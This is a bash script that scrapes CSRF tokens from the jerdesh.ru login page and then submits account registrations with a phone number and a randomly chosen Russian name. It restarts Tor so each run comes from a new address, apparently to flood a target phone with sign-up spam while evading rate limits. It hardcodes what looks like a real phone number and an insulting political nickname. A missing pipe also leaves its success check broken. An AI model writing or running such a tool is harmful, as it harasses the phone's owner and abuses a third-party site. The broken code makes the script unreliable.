#!/bin/bash
PHONE="$1"
NAME_RAW="$(shuf -n 1 male_names_rus.txt)"
NAME=$(printf %s "$NAME_RAW" |jq -sRr @uri)
echo "$PHONE $NAME_RAW"

DATA=$(curl -s 'http://jerdesh.ru/bet/login' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'DNT: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://jerdesh.ru/' \
  -H 'Accept-Language: ru-UA,ru;q=0.9' \
  --compressed \
  --insecure)

CSRFName=$(echo "$DATA" | grep "name='CSRFName" | sed -E "s/.*name='CSRFName' value='([^\']+)'.*/\1/")
#echo "$CSRFName"
CSRFToken=$(echo "$DATA" | grep "name='CSRFToken" | sed -E "s/.*name='CSRFToken' value='([^\']+)'.*/\1/")
#echo "$CSRFToken"
PHONE="79533615709"
NAME_RAW="путлер"
curl -s "http://jerdesh.ru/user/register?CSRFName=$CSRFName&CSRFToken=$CSRFToken&email=$PHONE&name=$NAME" \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'DNT: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H "Referer: http://jerdesh.ru/user/login?CSRFName=$CSRFName&CSRFToken=$CSRFToken&tel=$PHONE" \
  -H 'Accept-Language: ru-UA,ru;q=0.9' \
  --compressed \
  --insecure  grep 'value="'"$PHONE"'"' | if [ "$(wc -l)" = "0" ]; then echo "fail"; else echo "ok"; fi;

pkill -sighup tor 2>/dev/null
